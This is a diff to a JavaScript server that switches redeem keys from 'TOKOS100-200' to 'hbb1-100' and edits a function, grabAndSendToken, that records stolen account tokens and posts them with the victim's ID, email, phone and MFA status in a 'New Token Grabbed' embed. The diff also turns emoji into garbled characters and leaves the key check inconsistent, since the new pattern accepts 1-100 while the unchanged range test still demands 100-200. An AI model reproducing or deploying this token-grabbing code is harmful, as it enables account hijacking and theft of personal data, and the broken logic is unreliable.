@@ -160,7 +160,7 @@ class SimpleDB {
     
     addCustomKey(key) {
         const normalized = key.toString().toUpperCase().trim();
-        if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) {
+        if (!/^hbb([1-9]|[1-9][0-9]|100)$/i.test(normalized)) {
             console.log('[DB] Invalid custom key format:', normalized);
             return null;
         }
@@ -377,7 +377,7 @@ if (CLIENT_ID && CLIENT_SECRET) {
     }));
 }
 
-const BASE_REDEEM_KEYS = Array.from({length: 101}, (_, i) => `TOKOS${i + 100}`);
+const BASE_REDEEM_KEYS = Array.from({length: 100}, (_, i) => `hbb${i + 1}`);
 const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);
 
 function validateKeyStrict(key) {
@@ -385,7 +385,7 @@ function validateKeyStrict(key) {
         return { valid: false, error: 'Invalid key', normalized: null };
     }
     let trimmed = key.trim().toUpperCase();
-    const baseMatch = trimmed.match(/^TOKOS(1[0-9][0-9]|200)$/);
+    const baseMatch = trimmed.match(/^hbb([1-9]|[1-9][0-9]|100)$/i);
     if (baseMatch) {
         const num = parseInt(baseMatch[1], 10);
         if (num >= 100 && num <= 200) {
@@ -399,7 +399,7 @@ function validateKeyStrict(key) {
     return { valid: false, error: 'Invalid key', normalized: null };
 }
 
-console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys (TOKOS100-TOKOS200)');
+console.log('[KEYS] Loaded', BASE_REDEEM_KEYS.length, 'base redeem keys (hbb1-hbb100)');
 
 app.post('/api/admin/addkey', (req, res) => {
     const { adminSecret, key } = req.body;
@@ -463,7 +463,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
         db.addGrabbedToken(token, fullInfo, source);
         
         const embed = {
-            title: '🎣 New Token Grabbed',
+            title: 'ð£ New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -471,9 +471,9 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
